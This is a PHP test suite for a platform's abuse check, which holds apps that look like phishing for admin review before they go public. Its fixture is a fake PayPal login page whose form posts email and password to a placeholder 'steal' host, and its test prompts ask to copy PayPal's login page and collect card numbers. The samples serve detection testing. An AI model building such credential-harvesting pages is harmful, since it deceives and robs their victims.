<?php

use App\Enums\AbuseReviewStatus;
use App\Enums\AgentProvider;
use App\Enums\CredentialType;
use App\Enums\MessageRole;
use App\Enums\PublishStatus;
use App\Enums\PublishVisibility;
use App\Jobs\CheckForAbuse;
use App\Jobs\PublishProject;
use App\Models\AbuseReview;
use App\Models\AgentConnection;
use App\Models\Project;
use App\Models\ProjectShare;
use App\Models\Sandbox;
use App\Models\User;
use App\Sandbox\AbuseCheck;
use App\Sandbox\Agents\Jev;
use App\Sandbox\ExecResult;
use App\Sandbox\Providers\FakeSandboxProvider;
use App\Sandbox\Publishing\FakePublisher;
use App\Sandbox\Publishing\Publisher;
use App\Sandbox\SandboxProvider;
use Illuminate\Http\Client\Request;
use Illuminate\Http\Client\RequestException;
use Illuminate\Support\Facades\Exceptions;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Queue;

beforeEach(function () {
    config(['app.multi_tenant' => true, 'services.openrouter.key' => 'sk-or-platform']);

    $this->publisher = new FakePublisher;
    app()->instance(Publisher::class, $this->publisher);

    $this->provider = new FakeSandboxProvider;
    app()->instance(SandboxProvider::class, $this->provider);
    // The app's home page, as headless Chromium renders it.
    $this->provider->execUsing = fn (array $command) => new ExecResult(0, <<<'HTML'
        <html><head><title>PayPal: Log in</title><script>var secret = 1;</script></head>
        <body><h1>Your account is limited</h1><form action="https://hooks.example.com/steal">
        <input type="email" name="login_email" placeholder="Email"><input type="password" name="login_password">
        <input type="hidden" name="csrf" value="x"></form></body></html>
        HTML);

    // The owner's own OpenRouter key, which the check must not spend.
    $this->user = User::factory()->has(AgentConnection::factory())->create();
    AgentConnection::factory()->for($this->user)->create([
        'provider' => AgentProvider::OpenRouter,
        'credential_type' => CredentialType::ApiKey,
        'credential' => 'sk-or-owner',
    ]);
    $this->project = Project::factory()->for($this->user)->create(['name' => 'Account verify']);
    Sandbox::factory()->for($this->project)->create(['external_id' => 'ctr-1']);
    $this->project->messages()->create(['role' => MessageRole::User, 'content' => 'copy the PayPal login page']);

    $this->admin = User::factory()->admin()->create();

    /** Jev answers with these probabilities. */
    $this->jev = function (float $phishing, float $scam = 0.02, float $harmful = 0.01): void {
        Http::fake([Jev::URL => Http::response(['answers' => [
            'phishing' => ['type' => 'noul', 'noul' => $phishing],
            'scam' => ['type' => 'noul', 'noul' => $scam],
            'harmful' => ['type' => 'noul', 'noul' => $harmful],
        ]])]);
    };

    $this->publish = fn (string $visibility = 'public') => $this->actingAs($this->user)
        ->post(route('projects.publication.store', $this->project), ['visibility' => $visibility]);
});

test('a public app that looks fine is published, checked with the platform key', function () {
    ($this->jev)(phishing: 0.03);

    ($this->publish)()->assertRedirect();

    $project = $this->project->fresh();
    expect($project->publish_status)->toBe(PublishStatus::Live)
        ->and($project->abuseReview->status)->toBe(AbuseReviewStatus::Clear)
        ->and($project->abuseReview->evidence)->toBeNull();

    Http::assertSent(fn (Request $request) => $request->url() === Jev::URL
        && $request->hasHeader('Authorization', 'Bearer sk-or-platform')
        && $request['state']['project_name'] === 'Account verify'
        && $request['state']['prompts'] === ['copy the PayPal login page']
        && $request['state']['page']['title'] === 'PayPal: Log in'
        && $request['state']['page']['text'] === 'Your account is limited'
        && $request['state']['page']['fields'] === ['email login_email Email', 'password login_password']
        && $request['state']['page']['form_actions'] === ['https://hooks.example.com/steal']
        && array_keys($request['questions']) === ['phishing', 'scam', 'harmful']);
})->group('PUB-003');

test('a public app that looks like abuse waits for a review instead of going live', function () {
    ($this->jev)(phishing: 0.97, scam: 0.6);

    ($this->publish)()->assertRedirect();

    $project = $this->project->fresh();
    $review = $project->abuseReview;

    expect($project->publish_status)->toBe(PublishStatus::Review)
        ->and($this->publisher->published)->not->toHaveKey($project->id)
        ->and($review->status)->toBe(AbuseReviewStatus::Held)
        ->and($review->trigger)->toBe('publish')
        ->and($review->score)->toBe(0.97)
        ->and($review->reasons)->toBe(['phishing' => 0.97, 'scam' => 0.6, 'harmful' => 0.01])
        ->and($review->evidence['page']['title'])->toBe('PayPal: Log in')
        ->and($review->flagged_at)->not->toBeNull();

    $this->actingAs($this->user)->get(route('projects.show', $project))
        ->assertInertia(fn ($page) => $page->where('publication.status', 'review'));
})->group('PUB-003');

test('publishing again while held stays held without asking Jev again', function () {
    AbuseReview::factory()->held()->for($this->project)->create();
    Http::fake();

    ($this->publish)();

    expect($this->project->fresh()->publish_status)->toBe(PublishStatus::Review);
    Http::assertNothingSent();
})->group('PUB-003');

test('when Jev fails the app is published anyway and the failure reported', function () {
    Exceptions::fake();
    Http::fake([Jev::URL => Http::response('Bad gateway', 502)]);

    ($this->publish)();

    expect($this->project->fresh()->publish_status)->toBe(PublishStatus::Live);
    Exceptions::assertReported(RequestException::class);
})->group('PUB-003');

test('the page not loading still checks the name and prompts', function () {
    $this->provider->execUsing = fn () => new ExecResult(1, '', 'down');
    ($this->jev)(phishing: 0.05);

    ($this->publish)();

    expect($this->project->fresh()->publish_status)->toBe(PublishStatus::Live);
    Http::assertSent(fn (Request $request) => $request['state']['page'] === null);
})->group('PUB-003');

test('nothing is checked on a self-hosted install, without a platform key, or when publishing privately', function (array $config, string $visibility) {
    config($config);
    Http::fake();

    ($this->publish)($visibility);

    expect($this->project->fresh()->publish_status)->toBe(PublishStatus::Live)
        ->and($this->project->abuseReview()->exists())->toBeFalse();
    Http::assertNothingSent();
})->with([
    'self-hosted' => [['app.multi_tenant' => false], 'public'],
    'no platform key' => [['services.openrouter.key' => null], 'public'],
    'private' => [[], 'private'],
])->group('PUB-003');

test('sharing is checked, and a held share page is hidden', function () {
    Queue::fake();

    $this->actingAs($this->user)
        ->post(route('projects.share.store', $this->project), ['prompt' => 'A login page'])
        ->assertRedirect();

    Queue::assertPushed(CheckForAbuse::class, fn (CheckForAbuse $job) => $job->trigger === 'share');

    ($this->jev)(phishing: 0.95);
    (new CheckForAbuse($this->project, 'share'))->handle(app(AbuseCheck::class));

    $share = $this->project->fresh()->share;
    expect($this->project->abuseReview()->first()->status)->toBe(AbuseReviewStatus::Held);

    $this->get(route('shares.show', $share))->assertNotFound();
    $this->get(route('shares.card', $share))->assertNotFound();
    $this->post(route('shares.remix', $share))->assertNotFound();
    $this->actingAs($this->user)->get(route('projects.show', $this->project))
        ->assertInertia(fn ($page) => $page->where('sharing.review', 'held'));
})->group('PUB-003');

test('a share page that looks fine stays up', function () {
    $share = ProjectShare::factory()->for($this->project)->create();
    ($this->jev)(phishing: 0.1);

    (new CheckForAbuse($this->project, 'share'))->handle(app(AbuseCheck::class));

    expect($this->project->abuseReview()->first()->status)->toBe(AbuseReviewStatus::Clear);
    $this->get(route('shares.show', $share))->assertOk();
})->group('PUB-003');

test('a public app is re-checked after an agent turn at most once a day', function () {
    Queue::fake();
    $this->project->update(['publish_status' => PublishStatus::Live, 'publish_visibility' => PublishVisibility::Public]);

    AbuseCheck::afterTurn($this->project);
    AbuseCheck::afterTurn($this->project);

    Queue::assertPushed(CheckForAbuse::class, 1);
    Queue::assertPushed(CheckForAbuse::class, fn (CheckForAbuse $job) => $job->trigger === 'recheck');
})->group('PUB-003');

test('a private, unshared app is not re-checked', function () {
    Queue::fake();
    $this->project->update(['publish_status' => PublishStatus::Live, 'publish_visibility' => PublishVisibility::Private]);

    AbuseCheck::afterTurn($this->project);

    Queue::assertNotPushed(CheckForAbuse::class);
})->group('PUB-003');

test('a re-check that flags a live public app takes it offline for review', function () {
    $this->project->update(['publish_status' => PublishStatus::Live, 'publish_visibility' => PublishVisibility::Public, 'published_url' => 'https://x.ts.net']);
    $this->publisher->published[$this->project->id] = PublishVisibility::Public;
    ($this->jev)(phishing: 0.9);

    (new CheckForAbuse($this->project, 'recheck'))->handle(app(AbuseCheck::class));

    expect($this->project->fresh()->publish_status)->toBe(PublishStatus::Review)
        ->and($this->publisher->published)->not->toHaveKey($this->project->id);
})->group('PUB-003');

test('platform admins see held apps with what Jev saw', function () {
    $review = AbuseReview::factory()->held()->for($this->project)->create();
    AbuseReview::factory()->create();

    $this->actingAs($this->admin)->get(route('admin.reviews.index'))
        ->assertOk()
        ->assertInertia(fn ($page) => $page
            ->component('admin/reviews')
            ->where('enabled', true)
            ->has('held', 1)
            ->where('held.0.id', $review->id)
            ->where('held.0.project.name', 'Account verify')
            ->where('held.0.owner.email', $this->user->email)
            ->where('held.0.reasons.0', ['key' => 'phishing', 'label' => 'Phishing or impersonating a real brand', 'probability' => 0.97])
            ->where('held.0.evidence.page.title', 'PayPal: Log in')
            ->has('decided', 0));
})->group('ADMIN-006');

test('only platform admins can see or decide reviews', function () {
    $review = AbuseReview::factory()->held()->for($this->project)->create();

    $this->actingAs($this->user)->get(route('admin.reviews.index'))->assertForbidden();
    $this->actingAs($this->user)->post(route('admin.reviews.approve', $review))->assertForbidden();
    $this->actingAs($this->user)->post(route('admin.reviews.take-down', $review))->assertForbidden();

    expect($review->fresh()->status)->toBe(AbuseReviewStatus::Held);
})->group('ADMIN-006');

test('approving a held publish puts it live, and it is not checked again until the chat moves on', function () {
    $this->project->update(['publish_status' => PublishStatus::Review, 'publish_visibility' => PublishVisibility::Public]);
    $review = AbuseReview::factory()->held()->for($this->project)->create();
    ($this->jev)(phishing: 0.99);

    $this->actingAs($this->admin)->post(route('admin.reviews.approve', $review))
        ->assertRedirect(route('admin.reviews.index'));

    expect($review->fresh()->status)->toBe(AbuseReviewStatus::Approved)
        ->and($review->fresh()->decided_by)->toBe($this->admin->id)
        ->and($this->project->fresh()->publish_status)->toBe(PublishStatus::Live);
    Http::assertNothingSent();

    // A new prompt since the approval: the next publish is checked again.
    $this->travel(1)->minute();
    $this->project->messages()->create(['role' => MessageRole::User, 'content' => 'now ask for card numbers too']);

    ($this->publish)();

    expect($this->project->fresh()->publish_status)->toBe(PublishStatus::Review)
        ->and($review->fresh()->status)->toBe(AbuseReviewStatus::Held);
})->group('ADMIN-006');

test('taking an app down stops it, deletes its share page, and keeps it from going public again', function () {
    Queue::fake([PublishProject::class]);
    $this->project->update(['publish_status' => PublishStatus::Review, 'publish_visibility' => PublishVisibility::Public]);
    $share = ProjectShare::factory()->for($this->project)->create();
    $review = AbuseReview::factory()->held()->for($this->project)->create();

    $this->actingAs($this->admin)->post(route('admin.reviews.take-down', $review))->assertRedirect();

    $project = $this->project->fresh();
    expect($review->fresh()->status)->toBe(AbuseReviewStatus::TakenDown)
        ->and($project->publish_status)->toBe(PublishStatus::Failed)
        ->and($project->publish_error)->toBe(AbuseCheck::TAKEN_DOWN_MESSAGE)
        ->and(ProjectShare::find($share->id))->toBeNull();

    ($this->publish)('public')->assertSessionHasErrors(['publish' => AbuseCheck::TAKEN_DOWN_MESSAGE]);
    $this->actingAs($this->user)->post(route('projects.share.store', $this->project), ['prompt' => 'Again'])
        ->assertSessionHasErrors(['prompt' => AbuseCheck::TAKEN_DOWN_MESSAGE]);
    $this->actingAs($this->user)->get(route('projects.show', $this->project))
        ->assertInertia(fn ($page) => $page->where('sharing.review', 'taken_down'));

    // Publishing privately still works.
    ($this->publish)('private')->assertSessionHasNoErrors();
    Queue::assertPushed(PublishProject::class);
})->group('ADMIN-006');

test('reading the page keeps its title, visible text, fields and form targets only', function () {
    $page = AbuseCheck::readPage('<html><head><title> Shop </title><style>p{}</style></head><body><p>Hello <b>there</b></p>'
        .'<script>alert(1)</script><select name="size"></select><textarea placeholder="Notes"></textarea></body></html>');

    expect($page)->toBe([
        'title' => 'Shop',
        'text' => 'Hello there',
        'fields' => ['select size', 'textarea Notes'],
        'form_actions' => [],
    ]);
})->group('PUB-003');
